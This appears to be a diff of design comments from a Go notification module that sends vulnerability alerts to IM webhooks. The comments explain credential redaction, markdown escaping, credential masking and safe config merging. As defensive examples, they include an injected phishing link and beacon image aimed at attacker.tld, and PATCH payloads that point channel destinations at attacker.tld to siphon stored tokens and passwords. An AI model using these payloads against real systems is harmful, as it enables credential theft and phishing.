@@ -1,0 +1,169 @@
+260	IM notifications connect directly. Use a 15-second timeout; a slower peer is effectively failing.
+261	Reject cross-host redirects: delivery URLs are fixed endpoints and normally do not
+262	redirect to another host. Provider credentials (DingTalk access_token, WeCom key, Telegram
+263	bot token) are **in the URL**, so following cross-host redirects hands them to the destination. Same-host
+264	redirects, such as adding a trailing slash, remain allowed.
+265	respBodyLimit bounds response-body reads. A malfunctioning peer may return huge content; we need only
+266	an error code and a short description for delivery history.
+267	doJSON sends one request and returns the bounded response body.
+268	A nil payload sends an empty body (for GET or platforms requiring no body).
+269	headers are appended unchanged for generic Webhook custom headers.
+270	Error classification is central: network failures and 5xx/408/429 are retryable;
+271	other 4xx are permanent. Retrying a 403 merely logs the same error three times.
+272	Serialization failure is a local bug (incorrect configuration field type); retries cannot repair it.
+273	An invalid URL is usually a user input mistake and is a permanent failure.
+274	Again, do not pass err through: url.Parse errors include the complete URL.
+275	Connection refusal, DNS failure, and timeouts are usually transient; retry with backoff.
+276	Redact error text before exposing it. http.Client.Do returns *url.Error,
+277	whose Error() is `Op "complete URL": underlying error`; provider credentials are **in the URL**
+278	(DingTalk access_token, WeCom key, Feishu hook id, Telegram /bot<token>/).
+279	Without redaction, credentials flow to four places: notification_deliveries
+280	last_error (plaintext storage), delivery-history responses (**bypassing channel configuration masking**),
+281	server logs, and the test-send endpoint's 502 text returned to the frontend.
+282	429 (rate limiting) and 408 (timeout) merit retries; other 4xx indicate configuration or permission errors.
+283	snippet compresses a response body to a short single line for error messages. Responses may contain newlines and whitespace;
+284	putting them directly in last_error would break delivery-history layout.
+285	redactRequestTarget reduces delivery URLs to "scheme://host/…" for error messages.
+286	This is the package's sole URL-redaction policy, deliberately **coarse**: retain only scheme and host,
+287	discard everything else. There is no universal safe way to identify which URL component is a credential:
+288	DingTalk credentials in query      /robot/send?access_token=xxx
+289	WeCom credentials in query         /cgi-bin/webhook/send?key=xxx
+290	Feishu credentials in **last path segment** /open-apis/bot/v2/hook/<hook_id>
+291	Telegram credentials in **middle path segment** /bot<token>/sendMessage
+292	Keeping only useful parts would require channel-specific patches; missing any provider would leak credentials.
+293	The host suffices for troubleshooting DNS, connection, and certificate problems;
+294	identify the specific bot using the masked suffix in channel configuration.
+295	Return a fixed placeholder on parse failure; never echo the original string.
+296	redactTransportError removes URLs from transport errors, preserving only the underlying cause.
+297	*url.Error has {Op, URL, Err}; its Error() prints the URL too.
+298	Explicitly extract Err to bypass Error(), which is more reliable than subsequent string replacement:
+299	replacement must handle all URL-encoded and escaped variants and can miss some.
+300	Non-*url.Error values (such as redirect-policy errors) may also contain URLs; redact them consistently.
+301	redactURLsInText replaces http(s) URLs in text with redacted forms.
+302	This is a fallback for errors without structured fields (redirect-policy errors and custom third-party errors).
+303	Recognize only http/https prefixes; split at whitespace and quotes, which cannot occur in URLs.
+320	Shared message rendering for Markdown-based channels (DingTalk and WeCom).
+321	Feishu uses card JSON; Telegram and email use HTML, rendered in their adapters.
+322	maxAssetsShown limits displayed assets. A vulnerability can anchor dozens of assets;
+323	listing all would overflow the message without adding value. Few readers inspect domains beyond the fourth in IM.
+324	maxSummaryRunes limits summary length. IM messages prompt readers to view details;
+325	they are not the report itself. Full content lives on the platform.
+326	markdownReservedBytes reserves room for the header (batch summary, severity distribution, and possible truncation notice)
+327	and footer (platform link). Deduct this from the whole-item packing budget to prevent truncation of either;
+328	otherwise readers cannot identify the batch or how many items are missing.
+329	markdownEscape escapes markdown metacharacters.
+330	Why this is necessary: vulnerability title, summary, class, and asset display name all come from **untrusted sources**.
+331	Titles and summaries come from model output informed by target responses; asset URLs are full scanned
+332	URLs, including target-controlled query strings. Without escaping, a title such as
+333	Login SQL injection\n[Urgent: verify your account here](http://attacker.tld)
+334	would render as a **clickable external link** in the security engineer's DingTalk/Feishu client;
+335	`![](http://attacker.tld/beacon)` is fetched by the client during rendering, indicating
+336	that the vulnerability was viewed and exposing the reader's IP. Even benign injected bold text or
+337	blockquotes can push serious vulnerabilities below the fold.
+338	The escape set covers headings, links, emphasis, lists, blockquotes, and strikethrough: characters that change structure or create clickable
+339	elements. Process `\` first to avoid escaping newly inserted backslashes again.
+340	markdownText compresses untrusted text to one line and escapes it for markdown bodies.
+341	Single-line conversion complements escaping: newlines alone can forge list items or blockquotes,
+342	which character escaping cannot stop.
+343	markdownTitle returns the message title (IM title bar/card title) as **unescaped original text**.
+344	Deliberately do not escape here: this title is shared across rendering contexts: markdown bodies, Telegram
+345	HTML, Feishu card plain_text, generic Webhook JSON, and email subjects. Each context has
+346	different escaping rules (markdown escapes leave visible backslashes in HTML and contaminate JSON
+347	data), so each output sink must perform its own escaping; see writeItem / feishuItemLines /
+348	telegramEscape. Previously adding markdown escaping in the shared function caused Telegram messages
+349	to show literal backslashes such as `\(1\)`.
+350	markdownBody renders the message body and returns it with **the number of items actually included**.
+351	kept counts items actually delivered. Callers mark only the first kept entries
+352	delivered; entries excluded by channel limits must remain for the next batch, not be
+353	marked successful. Otherwise truncation causes silent loss: delivery records claim all items succeeded,
+354	with no indication that the latter part was never sent.
+355	maxBytes<=0 means unlimited.
+356	Send even an oversized single item, with final truncation as fallback: partial vulnerability information
+357	is better than no notification.
+358	markdownBatchIntro renders the batch introduction: time window, item count, and severity distribution.
+359	This lets recipients decide whether immediate action is needed without opening the platform.
+360	items are **actually included** entries; total is the intended batch size. If they differ, explicitly state
+361	how many continue in the next message; otherwise readers assume the header count covers everything,
+362	while unsent items are entirely absent from the interface.
+363	Show severity distribution so readers can spot serious entries. Count only entries **actually included**
+364	in this message so the critical count matches the entries visible below.
+365	writeItem renders one vulnerability entry.
+366	prefix is the batch sequence number; single=true renders full details (summary and backlink).
+367	Batch lists show a one-line summary, or a 50-item batch would become a long document.
+368	All external content (title/class/assets/summary) passes through markdownText:
+369	single-line conversion plus escaping. The backlink comes from administrator-configured public_base_url, not untrusted content,
+370	and must remain clickable, so output it unchanged.
+371	Batch mode: one line with compressed assets and summary appended.
+372	MaskedPrefix marks masked values. API responses replace credentials with values carrying this prefix;
+373	update requests interpret such values as keeping the stored value unchanged.
+374	A prefix, rather than an empty string or fixed constant, also allows some identifying information
+375	(see MaskedValue), letting users recognize the bot without repasting its key.
+376	MaskedValue generates a masked value:
+377	"__masked__"              Original too short; provide no hint.
+378	"__masked__:…ab12cd"      Include the last 6 characters as an identifying hint.
+379	Exposing only the final 6 characters is deliberate: Webhook identifiers occur near the end (WeCom key,
+380	Feishu bot id), whereas prefixes are shared and unhelpful. Six characters cannot reconstruct
+381	the credential but suffice for the configurator to recognize the group.
+382	IsMasked reports whether a value is masked (returned by the API and left unchanged).
+383	MaskConfig copies configuration, replacing channel credential fields with masked values.
+384	Unknown channel types return an empty map, not the original configuration; prefer an unavailable configuration UI
+385	o exposing raw content that may contain credentials when the channel type is unrecognized.
+386	Preserve noncredential fields unchanged so the UI can display them.
+387	Treat nested structures such as headers as one credential: inspecting subkeys would require each channel
+388	to declare another set of credential-subkey rules, with complexity exceeding the benefit.
+389	ErrDestinationChangedWithoutCredentials means the destination changed without explicit input for
+390	credential fields. Return it rather than silently allowing the change or dropping credentials; see PrepareConfigUpdate.
+391	PrepareConfigUpdate merges channel configuration and handles security-sensitive destination changes.
+392	It replaces bare MergeConfig in channel updates to block this verified attack path:
+393	destination and credentials are independent fields, while MergeConfig preserves stored values
+394	for omitted keys. Anyone able to PATCH a channel could **change only the destination,
+395	omitting credentials**, causing the server to send stored credentials to an attacker-controlled endpoint:
+396	webhook  {config:{url:"https://attacker.tld"}}  -> original Authorization header sent externally
+397	telegram {config:{base_url:"https://attacker.tld"}} -> /bot<realToken>/sendMessage
+398	email    {config:{host:"smtp.attacker.tld"}}    -> username and password sent after STARTTLS
+399	This is entirely silent and needs no redirect, so denying cross-host redirects does not stop it;
+400	it directly defeats masking's goal of never returning credentials to the browser.
+401	Rule: whenever a destination key changes, callers must explicitly address **every** credential key:
+402	  - Supply a new value -> use it.
+403	  - Explicitly supply an empty string -> no credential needed for this field (preserve clearing semantics).
+404	  - Return the masked value unchanged or omit the key -> reject.
+405	The third case is rejected because a masked value means reusing the old credential, which
+406	belongs only to the old destination. Deliberately do not automatically discard credentials: optional fields
+407	(webhook headers, email password) would silently lose authentication while returning 200,
+408	making diagnosis harder than an error. Prefer requiring explicit re-entry.
+409	A masked literal inside a nonstring credential value (such as a webhook headers object)
+410	means the caller embedded a keep-original sentinel inside a structure. MergeConfig recognizes only strings
+411	with the prefix as masked; this would be stored as an ordinary object, persisting literal
+412	"__masked__" and silently breaking subsequent authentication. Reject it instead.
+413	This check must come **first**: an unchanged destination returns early, so placing it later
+414	covers only destination changes (the initial version made this mistake, caught by tests).
+415	Find genuinely changed destination keys. Masked values mean unchanged.
+416	Unchanged destination: normal merge (masked preserves, empty clears, otherwise overwrite).
+417	Changed destination: require explicit input for every credential key.
+418	rejectMaskedInContainers rejects masked sentinels embedded in nonstring structures.
+419	Masking assumes the **entire value is a string**. Object fields such as webhook headers
+420	must be masked as a whole (the string "__masked__") or submitted as a whole; embedded sentinels
+421	cannot express keeping values unchanged and would be stored as real values.
+422	sameConfigValue compares configuration values for equivalence. JSON serialization also handles
+423	type differences: frontend ports are numbers and stored ports are float64; direct == could misclassify them.
+424	Normalize blank values first: an empty string and a missing key represent the same state here,
+425	because MergeConfig explicitly clears an empty string by deleting its key. Without normalization, an
+426	optional destination field left blank (Telegram base_url is the only one; blank uses the
+427	official URL) follows this sequence:
+428	Creation stores base_url:"" -> first save removes the key through MergeConfig.
+429	-> Second save: incoming is "", stored lacks the key; classified as a destination change.
+430	-> Credentials are masked -> 400 requiring credentials to be re-entered with the changed destination.
+431	Every subsequent save fails unless the user repastes the Bot Token, despite changing nothing.
+432	isBlankConfigValue reports whether a configuration value is blank.
+433	Its definition must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
+434	or MergeConfig may consider a value removable while sameConfigValue considers it present.
+435	MergeConfig merges incoming over stored to update channel configuration.
+436	Rules:
+437	  - Masked incoming value -> preserve stored value (the user did not edit this field).
+438	  - Empty incoming string -> explicit clearing; delete the key.
+439	  - Other keys -> overwrite with incoming values.
+440	  - Keys present only in stored -> preserve (partial-update semantics).
+441	Whether an empty string clears must be explicit: frontend forms submit blank fields as empty strings;
+442	storing those as real values would clear fields intended to retain their existing values.
+443	Choose explicit clearing because users have no other way to remove a misconfigured field
+444	(omitting a field distinguishes absent from explicitly empty, but the UI does not use that distinction).
